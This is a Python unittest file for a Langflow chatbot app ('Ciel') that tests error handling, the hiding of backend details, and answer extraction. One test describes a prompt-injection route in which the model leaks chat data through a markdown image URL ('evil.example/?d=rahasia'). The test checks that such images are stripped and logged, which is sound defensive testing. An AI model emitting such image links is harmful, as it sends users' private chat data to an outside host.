import ast
import json
import unittest
from pathlib import Path
from unittest.mock import patch

import requests


APP_PATH = Path(__file__).resolve().parents[1] / "app.py"


def load_app_functions():
    source = APP_PATH.read_text(encoding="utf-8")
    tree = ast.parse(source)

    function_nodes = [
        node
        for node in tree.body
        if (isinstance(node, ast.FunctionDef)
            and node.name in ("ask_langflow", "final_answer_text", "upload_images",
                              "is_error_answer", "split_error", "strip_markdown_images",
                              "security_event"))
        or (isinstance(node, ast.ClassDef) and node.name == "CielError")
        or (isinstance(node, ast.Assign)
            and getattr(node.targets[0], "id", None) in ("MARKDOWN_IMAGE", "IMAGE_REMOVED"))
    ]

    namespace = {
        "requests": requests,
        "re": __import__("re"),
        "uuid": __import__("uuid"),
        "time": __import__("time"),
        "logger": __import__("logging").getLogger("test_resilience"),
        "NGROK_URL": "https://example.invalid",
        "FLOW_ID": "test-flow",
        "LANGFLOW_API_KEY": "test-key",
        "NGROK_USER": "test-user",
        "NGROK_PASSWORD": "test-password",
    }

    module = ast.Module(
        body=function_nodes,
        type_ignores=[],
    )

    code = compile(
        module,
        str(APP_PATH),
        "exec",
    )

    exec(code, namespace)

    return namespace


APP_FUNCTIONS = load_app_functions()
ask_langflow = APP_FUNCTIONS["ask_langflow"]
upload_images = APP_FUNCTIONS["upload_images"]
is_error_answer = APP_FUNCTIONS["is_error_answer"]
split_error = APP_FUNCTIONS["split_error"]


class DummyResponse:

    def __init__(
        self,
        status_code=200,
        data=None,
        text="backend-detail",
        json_error=False,
    ):
        self.status_code = status_code
        self.text = text
        self.data = data
        self.json_error = json_error

    def raise_for_status(self):

        if self.status_code >= 400:
            raise requests.exceptions.HTTPError(
                f"{self.status_code} simulated error"
            )

    def json(self):

        if self.json_error:
            raise ValueError("invalid json")

        return self.data


def success_response():

    return DummyResponse(
        status_code=200,
        data={
            "outputs": [
                {
                    "outputs": [
                        {
                            "results": {
                                "message": {
                                    "data": {
                                        "text": "Jawaban test"
                                    }
                                }
                            }
                        }
                    ]
                }
            ]
        },
    )


class TestResiliencePolicy(unittest.TestCase):

    def test_success(self):

        with patch(
            "requests.post",
            return_value=success_response(),
        ) as mock_post:

            result = ask_langflow("test")

        self.assertEqual(result, "Jawaban test")
        self.assertEqual(mock_post.call_count, 1)

    def test_images_in_answers_are_removed_and_logged(self):
        # Prompt injection could make the model leak chat data through an image URL.
        response = success_response()
        response.data["outputs"][0]["outputs"][0]["results"]["message"]["data"]["text"] = (
            "Hasil ![x](https://evil.example/?d=rahasia) selesai"
        )

        with patch("requests.post", return_value=response), \
                self.assertLogs("test_resilience", level="WARNING") as logs:
            result = ask_langflow("test")

        self.assertEqual(result, "Hasil [gambar dihapus] selesai")
        self.assertTrue(any("security_event kind=answer_image_removed" in line and "count=1" in line for line in logs.output))

    def test_authentication_failures(self):

        for status in (401, 403):

            with self.subTest(status=status):

                response = DummyResponse(
                    status_code=status,
                    text="SECRET_BACKEND_DETAIL",
                )

                with patch(
                    "requests.post",
                    return_value=response,
                ) as mock_post:

                    result = ask_langflow("test")

                self.assertIn(
                    "masalah konfigurasi",
                    result,
                )

                self.assertNotIn(
                    "SECRET_BACKEND_DETAIL",
                    result,
                )

                self.assertEqual(
                    mock_post.call_count,
                    1,
                )

    def test_rate_limit(self):

        response = DummyResponse(
            status_code=429,
            text="SECRET_BACKEND_DETAIL",
        )

        with patch(
            "requests.post",
            return_value=response,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "terlalu banyak permintaan",
            result,
        )

        self.assertNotIn(
            "SECRET_BACKEND_DETAIL",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_internal_server_error(self):

        response = DummyResponse(
            status_code=500,
            text="SECRET_BACKEND_DETAIL",
        )

        with patch(
            "requests.post",
            return_value=response,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "internal error",
            result,
        )

        self.assertNotIn(
            "SECRET_BACKEND_DETAIL",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_gateway_failures(self):

        for status in (502, 503, 504):

            with self.subTest(status=status):

                response = DummyResponse(
                    status_code=status,
                    text="SECRET_BACKEND_DETAIL",
                )

                with patch(
                    "requests.post",
                    return_value=response,
                ) as mock_post:

                    result = ask_langflow("test")

                self.assertIn(
                    "tidak tersedia",
                    result,
                )

                self.assertNotIn(
                    "SECRET_BACKEND_DETAIL",
                    result,
                )

                self.assertEqual(
                    mock_post.call_count,
                    1,
                )

    def test_timeout(self):

        with patch(
            "requests.post",
            side_effect=requests.exceptions.Timeout,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "terlalu lama menjawab",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_connection_error(self):

        with patch(
            "requests.post",
            side_effect=requests.exceptions.ConnectionError,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "tidak bisa dihubungi",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_invalid_json(self):

        response = DummyResponse(
            status_code=200,
            json_error=True,
        )

        with patch(
            "requests.post",
            return_value=response,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "bukan JSON yang valid",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_invalid_output_structure(self):

        response = DummyResponse(
            status_code=200,
            data={
                "outputs": []
            },
        )

        with patch(
            "requests.post",
            return_value=response,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "format output tidak dikenali",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_unknown_http_status_is_graceful(self):

        response = DummyResponse(
            status_code=418,
            text="SECRET_BACKEND_DETAIL",
        )

        with patch(
            "requests.post",
            return_value=response,
        ) as mock_post:

            result = ask_langflow("test")

        self.assertIn(
            "HTTP Status: 418",
            result,
        )

        self.assertIn(
            "Request ID:",
            result,
        )

        self.assertNotIn(
            "SECRET_BACKEND_DETAIL",
            result,
        )

        self.assertEqual(
            mock_post.call_count,
            1,
        )

    def test_session_id_and_tweaks_are_sent(self):

        tweaks = {
            "CielMemorySearch-BC6pl": {"memory_owner": "abc"},
        }

        with patch(
            "requests.post",
            return_value=success_response(),
        ) as mock_post:

            ask_langflow(
                "test",
                tweaks=tweaks,
                session_id="visitor-chat1",
            )

        payload = mock_post.call_args.kwargs["json"]

        self.assertEqual(payload["session_id"], "visitor-chat1")
        self.assertEqual(payload["tweaks"], tweaks)

    def test_session_id_is_omitted_when_not_given(self):

        with patch(
            "requests.post",
            return_value=success_response(),
        ) as mock_post:

            ask_langflow("test")

        payload = mock_post.call_args.kwargs["json"]

        self.assertNotIn("session_id", payload)
        self.assertNotIn("tweaks", payload)


def agent_response(message):

    return DummyResponse(
        status_code=200,
        data={"outputs": [{"outputs": [{"results": {"message": message}}]}]},
    )


class TestFinalAnswerExtraction(unittest.TestCase):
    # Langflow 1.12 joins every Agent text block into message.text, so the
    # answer came out twice or glued to text written before a tool call.

    def ask(self, message):

        with patch("requests.post", return_value=agent_response(message)):
            return ask_langflow("test")

    def test_real_langflow_message_returns_only_the_final_answer(self):

        fixture = json.loads(
            (APP_PATH.parent / "tests" / "assets" / "langflow_agent_message.json")
            .read_text(encoding="utf-8")
        )

        result = self.ask(fixture)

        self.assertEqual(
            result,
            "Rata-rata Quantity_Sold pada dataset adalah **23,685** — kalau dibulatkan jadi **23,69**.",
        )
        self.assertEqual(result.count("Rata-rata"), 1)
        self.assertGreater(fixture["data"]["text"].count("Rata-rata"), 1)

    def test_text_written_before_a_tool_call_is_dropped(self):

        message = {
            "data": {"text": "Aku hitung langsung dari filenya ya.Totalnya 9.335.750."},
            "content_blocks": [{"contents": [
                {"type": "text", "header": {}, "text": "Aku hitung langsung dari filenya ya."},
                {"type": "tool_use", "name": "analyze_table"},
                {"type": "text", "header": {}, "text": "Totalnya 9.335.750."},
                {"type": "text", "header": {"title": "Output"}, "text": "Aku hitung langsung dari filenya ya.Totalnya 9.335.750."},
            ]}],
        }

        self.assertEqual(self.ask(message), "Totalnya 9.335.750.")

    def test_without_content_blocks_uses_data_text(self):

        self.assertEqual(
            self.ask({"data": {"text": "Jawaban lama"}, "content_blocks": []}),
            "Jawaban lama",
        )

    def test_unexpected_message_shape_is_a_parse_error(self):

        for message in (None, "teks", {"content_blocks": []}):
            with self.subTest(message=message):
                self.assertIn("format output tidak dikenali", self.ask(message))


class TestNoInternalDetailsShownToUsers(unittest.TestCase):
    # Public users used to see Langflow's raw JSON on an unknown response
    # shape, and raw exception text (which can name the ngrok host) on other
    # request errors. Details now go to the server log; users get a Request ID.

    HOST = "secret-host.ngrok-free.dev"

    def test_unknown_response_shape_hides_raw_json(self):

        response = DummyResponse(
            status_code=200,
            data={"outputs": [{"internal": "INTERNAL_NODE_DETAIL"}]},
        )

        with self.assertLogs("test_resilience", level="ERROR") as logs, \
                patch("requests.post", return_value=response):
            result = ask_langflow("test")

        self.assertIn("format output tidak dikenali", result)
        self.assertIn("Request ID:", result)
        # The advice must stay visible: paragraphs mentioning "Request ID"
        # are moved into the error card's technical details.
        advice = next(p for p in result.split("\n\n") if "Silakan coba lagi" in p)
        self.assertNotIn("Request ID", advice)
        self.assertNotIn("INTERNAL_NODE_DETAIL", result)
        self.assertNotIn("```json", result)
        self.assertIn("INTERNAL_NODE_DETAIL", "\n".join(logs.output))

    def test_request_errors_do_not_reveal_the_backend_url(self):

        errors = (
            requests.exceptions.InvalidURL(f"Invalid URL 'https://{self.HOST}/api/v1/run/x'"),
            requests.exceptions.TooManyRedirects(f"Exceeded redirects for https://{self.HOST}/"),
            requests.exceptions.ChunkedEncodingError(f"Connection broken: {self.HOST}"),
        )

        for error in errors:
            with self.subTest(error=type(error).__name__):

                with self.assertLogs("test_resilience", level="ERROR") as logs, \
                        patch("requests.post", side_effect=error):
                    result = ask_langflow("test")

                self.assertTrue(result.startswith("Permintaan ke Ciel gagal."))
                self.assertIn("Request ID:", result)
                self.assertNotIn(self.HOST, result)
                self.assertIn(self.HOST, "\n".join(logs.output))

    def test_image_upload_errors_do_not_reveal_the_backend_url(self):

        images = [{"name": "soal.png", "data": b"png", "mime": "image/png"}]
        errors = (
            requests.exceptions.TooManyRedirects(f"Exceeded redirects for https://{self.HOST}/"),
            requests.exceptions.ChunkedEncodingError(f"Connection broken: {self.HOST}"),
        )

        for error in errors:
            with self.subTest(error=type(error).__name__):

                with self.assertLogs("test_resilience", level="ERROR"), \
                        patch("requests.post", side_effect=error):
                    paths, message = upload_images(images)

                self.assertEqual(paths, [])
                self.assertTrue(message.startswith("Gambar gagal diunggah."))
                self.assertIn("Request ID:", message)
                self.assertNotIn(self.HOST, message)

        # InvalidURL is also a ValueError, so it takes the parse-error branch,
        # which shows no exception text either.
        invalid = requests.exceptions.InvalidURL(f"Invalid URL 'https://{self.HOST}/upload'")

        with self.assertLogs("test_resilience", level="ERROR"), \
                patch("requests.post", side_effect=invalid):
            _, message = upload_images(images)

        self.assertNotIn(self.HOST, message)


class TestErrorsReadAsPlainSentences(unittest.TestCase):
    # Errors used to start with an emoji (the UI detected them by it) and told
    # public users to "make sure Langflow Desktop and ngrok are running".
    # Now the CielError type marks a failure, and what users read (title and
    # advice) is a plain sentence; backend names stay in the technical part.

    BACKEND_WORDS = ("ngrok", "langflow")

    def failures(self):
        ask_cases = [
            ("timeout", {"side_effect": requests.exceptions.Timeout}),
            ("connection", {"side_effect": requests.exceptions.ConnectionError}),
            ("request", {"side_effect": requests.exceptions.TooManyRedirects("x")}),
            ("invalid json", {"return_value": DummyResponse(json_error=True)}),
            ("bad shape", {"return_value": DummyResponse(data={"outputs": []})}),
        ] + [
            (f"http {status}", {"return_value": DummyResponse(status_code=status)})
            for status in (401, 403, 418, 429, 500, 502, 503, 504)
        ]
        images = [{"name": "soal.png", "data": b"png", "mime": "image/png"}]
        upload_cases = [
            ("upload timeout", {"side_effect": requests.exceptions.Timeout}),
            ("upload connection", {"side_effect": requests.exceptions.ConnectionError}),
            ("upload bad shape", {"return_value": DummyResponse(data={})}),
        ] + [
            (f"upload http {status}", {"return_value": DummyResponse(status_code=status)})
            for status in (401, 404, 500)
        ]

        for name, kwargs in ask_cases:
            with patch("requests.post", **kwargs), self.assertLogs("test_resilience", level="ERROR"):
                yield name, ask_langflow("test")

        for name, kwargs in upload_cases:
            with patch("requests.post", **kwargs), self.assertLogs("test_resilience", level="ERROR"):
                yield name, upload_images(images)[1]

    def test_every_failure_is_a_ciel_error_with_plain_user_text(self):
        for name, message in self.failures():
            with self.subTest(case=name):
                self.assertTrue(is_error_answer(message))
                self.assertIn("Request ID:", message)

                title, plain, _technical = split_error(message)
                user_text = " ".join([title, *plain])
                self.assertTrue(user_text[0].isalnum(), user_text)
                self.assertTrue(user_text.isascii(), f"non-ASCII (emoji?) in: {user_text}")
                for word in self.BACKEND_WORDS:
                    self.assertNotIn(word, user_text.lower())

    def test_normal_answers_are_not_errors(self):
        with patch("requests.post", return_value=success_response()):
            self.assertFalse(is_error_answer(ask_langflow("test")))
        self.assertFalse(is_error_answer("❌ teks biasa yang kebetulan diawali emoji"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
